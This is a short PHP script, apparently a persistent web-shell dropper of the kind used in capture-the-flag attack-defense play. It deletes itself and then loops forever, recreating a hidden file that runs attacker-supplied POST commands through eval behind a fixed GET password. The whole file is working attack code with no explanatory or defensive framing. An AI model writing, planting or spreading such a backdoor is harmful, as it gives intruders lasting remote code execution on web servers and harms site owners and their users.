<?php
ignore_user_abort(true);
set_time_limit(0);
$file = './-g&t.php';
$code = "<?php if(\$_GET['pass']=='DUBHE'){@eval(\$_POST['cmd']);}?>";
while (1){
	if (!file_exists($file)) {
		file_put_contents($file,$code);
	}
	usleep(100);
	unlink(__FILE__);
}
?>